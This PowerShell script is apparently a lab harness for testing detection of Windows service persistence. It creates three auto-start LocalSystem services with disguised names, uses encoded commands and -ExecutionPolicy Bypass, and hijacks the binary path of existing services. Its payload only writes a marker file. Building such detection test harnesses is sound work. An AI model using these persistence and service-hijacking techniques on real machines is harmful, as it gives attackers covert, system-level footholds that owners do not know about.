$workDir = Join-Path $env:ProgramData 'PersistenceShowdownLab\Services'
$payloadPath = 'C:\Users\Public\Documents\pwned.txt'
$payloadText = 'Pwn3d'
$psExe = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
$cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
$wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'

$newServiceNames = @(
    'PSUnitSvcProfileCache',
    'PSUnitSvcWinUpdateCache',
    'PSUnitSvcScriptHost'
)

# Availability varies by Windows 11 image. These are chosen to avoid boot-critical services.
$existingServiceCandidates = @(
    'Fax',
    'RetailDemo',
    'MapsBroker',
    'WMPNetworkSvc',
    'XblGameSave',
    'WalletService',
    'lfsvc',
    'WerSvc'
)

function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }

function Invoke-ServiceAttempt {
    param([string]$Name, [scriptblock]$ScriptBlock)

    try {
        & $ScriptBlock
    } catch {
        Write-Warn "Service attempt '$Name' failed: $_"
    }
}

function Remove-LabService {
    param([string]$Name)

    $service = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($null -eq $service) { return }

    try {
        if ($service.Status -ne 'Stopped') {
            Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
        }
    } catch {}

    & sc.exe delete $Name | Out-Null
    for ($i = 0; $i -lt 20; $i++) {
        if ($null -eq (Get-Service -Name $Name -ErrorAction SilentlyContinue)) { break }
        Start-Sleep -Milliseconds 250
    }
}

function Remove-NewLabServices {
    foreach ($name in $newServiceNames) {
        Remove-LabService -Name $name
    }
}

function New-PayloadScript {
    param([string]$Path, [int]$DelaySeconds = 0)

    $content = @"
`$ErrorActionPreference = 'SilentlyContinue'
if ($DelaySeconds -gt 0) { Start-Sleep -Seconds $DelaySeconds }
New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null
Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII
"@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
}

function New-PayloadVbs {
    param([string]$Path)

    $content = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists("C:\Users\Public\Documents") Then
    fso.CreateFolder("C:\Users\Public\Documents")
End If
Set f = fso.CreateTextFile("C:\Users\Public\Documents\pwned.txt", True)
f.Write "Pwn3d"
f.Close
'@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
}

function New-EncodedPayload {
    $command = "New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null; Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII"
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
}

function New-LabService {
    param(
        [string]$Name,
        [string]$DisplayName,
        [string]$Description,
        [string]$BinaryPath,
        [switch]$DelayedAuto
    )

    Remove-LabService -Name $Name

    & sc.exe create $Name binPath= $BinaryPath start= auto obj= LocalSystem DisplayName= $DisplayName | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "sc.exe create failed for $Name"
    }

    & sc.exe description $Name $Description | Out-Null
    if ($DelayedAuto) {
        & sc.exe config $Name start= delayed-auto | Out-Null
    }

    Write-OK "Created service $Name"
}

function Set-ExistingServicePersistence {
    param([string]$Name, [string]$BinaryPath, [switch]$DelayedAuto)

    & sc.exe config $Name binPath= $BinaryPath start= auto | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "sc.exe config failed for $Name"
    }
    if ($DelayedAuto) {
        & sc.exe config $Name start= delayed-auto | Out-Null
    }
    Write-OK "Overwrote existing service name $Name"
}

function Get-HijackTargets {
    $targets = @()
    foreach ($name in $existingServiceCandidates) {
        try {
            $svc = Get-WmiObject Win32_Service -Filter "Name='$name'" -ErrorAction Stop
            if ($null -ne $svc) {
                $targets += $name
                if ($targets.Count -ge 2) { break }
            }
        } catch {}
    }
    return @($targets)
}

Write-Step "Preparing service helper files"
$profileCacheScript = Join-Path $workDir 'svc-profile-cache.ps1'
$eventBridgeScript = Join-Path $workDir 'svc-event-bridge.ps1'
$vbsScript = Join-Path $workDir 'svc-script-host.vbs'
$helpersReady = $false
try {
    New-Item -ItemType Directory -Path $workDir -Force -ErrorAction Stop | Out-Null
    New-PayloadScript -Path $profileCacheScript
    New-PayloadScript -Path $eventBridgeScript -DelaySeconds 15
    New-PayloadVbs -Path $vbsScript
    $helpersReady = $true
    Write-OK "Helper files written to $workDir"
} catch {
    Write-Warn "Could not prepare service helper files: $_"
}

Write-Step "Removing previous lab-owned new services"
try {
    Remove-NewLabServices
    Write-OK "Removed lab-owned new services if present"
} catch {
    Write-Warn "Could not remove previous lab-owned new services: $_"
}

Write-Step "Installing 3 new Windows service persistence variants"
$encoded = ''
try {
    $encoded = New-EncodedPayload
} catch {
    Write-Warn "Could not generate encoded service payload: $_"
}

Invoke-ServiceAttempt 'PSUnitSvcProfileCache' {
    if (-not $helpersReady) { throw 'helper files were not prepared' }
    New-LabService `
        -Name 'PSUnitSvcProfileCache' `
        -DisplayName 'Profile Cache Maintenance' `
        -Description 'Lab test: new auto-start service that launches a ProgramData PowerShell helper.' `
        -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`""
}

Invoke-ServiceAttempt 'PSUnitSvcWinUpdateCache' {
    if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
    New-LabService `
        -Name 'PSUnitSvcWinUpdateCache' `
        -DisplayName 'Windows Update Cache Monitor' `
        -Description 'Lab test: new delayed auto-start service using an encoded PowerShell command.' `
        -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" `
        -DelayedAuto
}

Invoke-ServiceAttempt 'PSUnitSvcScriptHost' {
    if (-not $helpersReady) { throw 'helper files were not prepared' }
    New-LabService `
        -Name 'PSUnitSvcScriptHost' `
        -DisplayName 'Script Host Telemetry' `
        -Description 'Lab test: new auto-start service using Windows Script Host and a VBS helper.' `
        -BinaryPath "$wscriptExe //B `"$vbsScript`""
}

Write-Step "Overwriting 2 existing service names"
$targets = @(Get-HijackTargets)
if ($targets.Count -lt 2) {
    Write-Warn "Only found $($targets.Count) existing service candidate(s). The script will overwrite what it found."
}

$i = 0
foreach ($target in $targets) {
    try {
        if ($i -eq 0) {
            if (-not $helpersReady) { throw 'helper files were not prepared' }
            Set-ExistingServicePersistence `
                -Name $target `
                -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$eventBridgeScript`"" `
                -DelayedAuto
        } else {
            Set-ExistingServicePersistence `
                -Name $target `
                -BinaryPath "$cmdExe /c if not exist C:\Users\Public\Documents mkdir C:\Users\Public\Documents & echo $payloadText>$payloadPath"
        }
        $i++
    } catch {
        Write-Warn "Could not overwrite existing service $target`: $_"
    }
}

Write-Host ""
Write-Host "[DONE] Installed Windows service unit-test persistences." -ForegroundColor Green
Write-Host "Created 3 new services and attempted to overwrite 2 existing service candidates." -ForegroundColor Yellow
Write-Host "Revert the VMware snapshot to restore the VM." -ForegroundColor Yellow
